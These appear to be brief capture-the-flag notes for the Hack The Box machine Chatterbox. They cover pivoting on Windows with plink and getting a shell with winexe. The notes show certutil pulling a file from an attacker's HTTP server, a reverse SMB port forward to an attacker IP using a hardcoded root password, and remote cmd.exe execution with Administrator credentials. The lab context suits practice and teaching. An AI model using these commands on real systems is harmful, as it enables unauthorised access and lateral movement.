First of all, do enumeration

To do port forwarding, you can use a tool called Plink

Plink Download - [https://www.chiark.greenend.org.uk/~sgtatham/putty/latest.html](https://www.chiark.greenend.org.uk/~sgtatham/putty/latest.html)

certutil is a tool that is used to download a file

so for example:

```
certutil -f http://your_http_server/file to_be_saved_as
```

In order for port forwarding to work, you should have ssh installed on your system and you should make a change in the config file of ssh

```
PermitRootLogin yes
```

Then:
```
service ssh restart
service ssh start
```

And then on your Windows machine, run:

```
plink.exe -l root -pw toor -R 445:127.0.0.1:445 10.10.14.5
```

-l is for username, -pw is for password, -R is for port forwarding.

so for this command, port 445 of this machine is going to localhost's port 445 which is then going to our kali machine.

Once you run this command, you can access your box from the windows box, boxception amirite?

We can then use a tool called winexe which basically allows you to run windows commands on linux. You can run this command for example:

```
winexe -Y Administrator%Welcome1! //127.0.0.1 "cmd.exe"
```

HTB Box to Practice: Chatterbox